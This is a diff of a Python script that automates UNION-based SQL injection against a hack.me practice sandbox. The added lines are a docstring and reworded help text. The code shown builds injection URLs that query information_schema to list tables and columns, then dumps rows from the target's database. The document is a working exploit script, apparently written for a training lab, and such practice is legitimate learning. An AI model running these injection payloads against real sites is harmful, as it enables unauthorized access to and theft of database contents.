@@ -1,3 +1,7 @@
+"""
+Very basic SQL Injection in hackme's sandbox https://hack.me/101309/set-of-sql-injectionsbasic-level.html
+To test you need to register on hackme and create your sandbox, then enter sandbox's URL in command line
+"""
 import requests, sys
 from bs4 import BeautifulSoup
 import argparse
@@ -6,12 +10,12 @@ import argparse
 def check_args():
     parse = argparse.ArgumentParser()
 
-    parse.add_argument('-u', '--url', help='enter url: -u http://s100296-101309-kq1.sipontum.hack.me')
+    parse.add_argument('-u', '--url',
+                       help='enter url: python3 hackme_inject0.py -u http://s100296-101309-kq1.sipontum.hack.me')
 
     args_list = parse.parse_args()
 
     return args_list.url
-
 
 
 tables = {}
@@ -57,18 +61,14 @@ def pull(url, result, product=None, action='tables'):
             i += 1
 
 
-
 table_injection = target + "/tshit.php?id=-1%20union%20select%201,2,table_name,4,5%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20"
 print('[!]Available tables: ')
-
 pull(table_injection, tables)
-
 
 for table in tables.values():
     print(f'[!] Pulling columns from {table}')
     inj = target + f"/tshit.php?id=-1 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='{table}' limit%20"
     pull(inj, columns, product=table, action='columns')
-
 
 for key, value in columns.items():
     print(f'[!] Pulling rows from {key}')
